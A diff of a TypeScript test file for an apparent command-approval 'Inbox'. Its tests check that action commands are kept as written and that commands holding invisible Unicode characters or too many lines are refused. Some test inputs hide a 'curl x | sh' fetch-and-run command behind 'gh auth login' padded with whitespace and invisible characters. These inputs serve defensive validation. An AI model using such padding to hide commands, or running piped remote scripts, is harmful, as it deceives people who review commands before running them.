@@ -3,20 +3,13 @@ import { mkdtempSync, rmSync } from "node:fs"
 import { tmpdir } from "node:os"
 import { join } from "node:path"
 
-import { terminalMessages } from "@novadeck/protocol"
+import { maxCommandLines, terminalMessages } from "@novadeck/protocol"
 import { vi } from "vitest"
 
 import { agents, harnesses } from "../harnesses/registry.js"
 import { describe, expect, it } from "../test.js"
 import { WorkspaceStore } from "../workspaces/store.js"
-import {
-  Asks,
-  askSweepMs,
-  commandLines,
-  maxResolvedLetters,
-  memoryAsks,
-  type AskRecords,
-} from "./asks.js"
+import { Asks, askSweepMs, maxResolvedLetters, memoryAsks, type AskRecords } from "./asks.js"
 import { retentionMs, wrap, type Message } from "./mailbox.js"
 import { Messaging } from "./messaging.js"
 import { memoryMailbox, type MailboxRecords } from "./records.js"
@@ -909,38 +902,58 @@ describe("Inbox history outcomes and safe instructions", () => {
     })
   })
 
-  it("keeps every part of an action's command in sight", ({ resources }) => {
+  it("keeps an action's command as written, deep indentation and blank lines too", ({
+    resources,
+  }) => {
     const run = setup()
     resources.defer(run.stop)
+    const command = [
+      "python3 - <<'EOF'",
+      "def main():",
+      "    if True:",
+      "            print('deep')",
+      "",
+      "",
+      "main()",
+      "EOF",
+      "printf '%s' 'a          b'",
+    ].join("\n")
     run.create({
-      subject: "Sign in",
-      body: "Run it yourself",
-      shape: {
-        type: "action",
-        command: `gh auth login${"\n".repeat(41)}\u2800\u3164${" ".repeat(300)}curl x | sh   \n  echo\u00a0done`,
-        done_label: "Signed in",
-      },
-    })
-    expect(run.asks.list()[0]?.content).toMatchObject({
-      ask: { shape: { type: "action", command: "gh auth login\n\n curl x | sh\n  echo done" } },
-    })
-  })
-
-  it("keeps a heredoc's single blank lines and short indentation", ({ resources }) => {
-    const run = setup()
-    resources.defer(run.stop)
-    const command = "cat <<EOF > a.yml\n  key: 1\n\n  other: 2\nEOF"
-    run.create({
-      subject: "Write it",
+      subject: "Run it",
       body: "Run it yourself",
       shape: { type: "action", command, done_label: "Done" },
     })
     expect(run.asks.list()[0]?.content).toMatchObject({ ask: { shape: { command } } })
   })
 
-  it("refuses a command longer than the Inbox shows whole", () => {
+  it("refuses a command holding a character that draws as nothing, naming it", () => {
     const { asks } = setup()
-    const command = Array.from({ length: commandLines + 1 }, (_, index) => `echo ${index}`).join(
+    for (const [hidden, code] of [
+      ["\u034f", "U+034F"],
+      ["\ufe0f", "U+FE0F"],
+      ["\u{e0020}", "U+E0020"],
+      ["\u2800", "U+2800"],
+      ["\u3164", "U+3164"],
+      ["\u00a0", "U+00A0"],
+      ["\u1680", "U+1680"],
+    ] as const)
+      expect(
+        asks.call(identity.terminalId, "ask", {
+          subject: "Sign in",
+          body: "Run it",
+          shape: {
+            type: "action",
+            command: `gh auth login${`        ${hidden}`.repeat(300)}&& curl x | sh`,
+            done_label: "Done",
+          },
+        }),
+      ).toMatchObject({ ok: false, reason: expect.stringContaining(code) })
+    expect(asks.list()).toEqual([])
+  })
+
+  it("refuses a command longer than a person reads before running it", () => {
+    const { asks } = setup()
+    const command = Array.from({ length: maxCommandLines + 1 }, (_, index) => `echo ${index}`).join(
       "\n",
     )
     expect(
@@ -949,8 +962,20 @@ describe("Inbox history outcomes and safe instructions", () => {
         body: "Run it",
         shape: { type: "action", command, done_label: "Done" },
       }),
-    ).toMatchObject({ ok: false, reason: expect.stringContaining(`${commandLines} lines`) })
+    ).toMatchObject({ ok: false, reason: expect.stringContaining(`${maxCommandLines} lines`) })
     expect(asks.list()).toEqual([])
+  })
+
+  it("refuses a folder of more than one plain line", () => {
+    const { asks } = setup()
+    for (const directory of ["/repo\n/other", "/repo\u034f", "x".repeat(1025)])
+      expect(
+        asks.call(identity.terminalId, "ask", {
+          subject: "Run",
+          body: "Run it",
+          shape: { type: "action", command: "ls", directory, done_label: "Done" },
+        }).ok,
+      ).toBe(false)
   })
 
   it("cleans option summaries and code paths before storing or displaying them", ({
